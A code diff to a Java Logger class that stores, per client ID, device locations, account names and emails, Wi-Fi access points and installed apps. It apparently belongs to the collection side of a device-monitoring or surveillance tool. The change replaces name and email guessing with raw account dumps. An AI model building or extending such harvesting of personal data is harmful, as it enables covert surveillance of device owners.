@@ -20,18 +20,18 @@ public class Logger {
     private static SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MMM-dd HH:mm:ss", Locale.getDefault());
     private ArrayList<String> accountNames = new ArrayList<String>();
 
-    File threadsLogFile, globalLogFile, clientThreadLogFile, locationsFile, userFile, wifiAPFile, installedAppsFile;
+    File threadsLogFile, globalLogFile, clientThreadLogFile, locationsFile, accountsFile, wifiAPFile, installedAppsFile;
     int logType;
     String clientId;
 
     public Logger(int logType, String clientId) {
         this.logType = logType;
         this.clientId = clientId;
-        threadsLogFile = new File("threads" + ".log");
-        globalLogFile = new File("logfile" + ".log");
+        threadsLogFile = new File("threads.log");
+        globalLogFile = new File("logfile.log");
         clientThreadLogFile = new File(clientId, "client-logfile.log");
         locationsFile = new File(clientId, "locations.log");
-        userFile = new File(clientId, "names-and-emails.log");
+        accountsFile = new File(clientId, "accounts.log");
         wifiAPFile = new File(clientId, "wifi-aps.log");
         installedAppsFile = new File(clientId, "installed-apps.log");
     }
@@ -102,34 +102,13 @@ public class Logger {
                     FileUtils.writeStringToFile(locationsFile, sbLoc.toString(), "UTF-8", true);
                     break;
                 case LOG_TYPE_ACCOUNTS:
-                    String email, guessName = "";
-                    String accountName = str.substring(
-                            str.indexOf("name=") + "name=".length(),
-                            str.indexOf(",")
-                    );
-                    if (accountName.contains("@") && accountName.contains(".")) {
-                        // entry is probably an email address
-                        accountName = "Email: " + accountName;
-                    } else if (!accountName.matches("WhatsApp") && !accountName.matches("LinkedIn")) {
-                        // entry is probably a name TODO more company names like the above
-                        accountName = "Name : " + accountName;
-                    } else {
-                        return;
-                    }
-                    if (!accountNames.contains(accountName)) {
-                        accountNames.add(accountName);
-                    }
-                    StringBuilder sbUsers = new StringBuilder();
-                    sbUsers.append(formatter.format(Calendar.getInstance().getTime()));
-                    sbUsers.append(" ");
-                    sbUsers.append(clientId);
-                    sbUsers.append("\r\n");
-                    // Try to get some human readable contact info
-                    for (String n : accountNames) {
-                        sbUsers.append(n);
-                        sbUsers.append("\r\n");
-                    }
-                    FileUtils.writeStringToFile(userFile, sbUsers.toString(), "UTF-8", false);
+                    StringBuilder sbAccounts = new StringBuilder();
+                    sbAccounts.append(formatter.format(Calendar.getInstance().getTime()));
+                    sbAccounts.append(" ");
+                    sbAccounts.append(clientId);
+                    sbAccounts.append("\r\n");
+                    sbAccounts.append(str);
+                    FileUtils.writeStringToFile(accountsFile, sbAccounts.toString(), "UTF-8", false);
                     break;
                 case LOG_WIFI_APS:
                     StringBuilder sbAPs = new StringBuilder();
@@ -146,7 +125,8 @@ public class Logger {
                     sbInstApps.append(formatter.format(Calendar.getInstance().getTime()));
                     sbInstApps.append(" ");
                     sbInstApps.append(clientId);
-                    sbInstApps.append(" ");
+                    sbInstApps.append("\r\n");
+                    sbInstApps.append(str);
                     FileUtils.writeStringToFile(installedAppsFile, sbInstApps.toString(), "UTF-8", false);
                     break;
             }
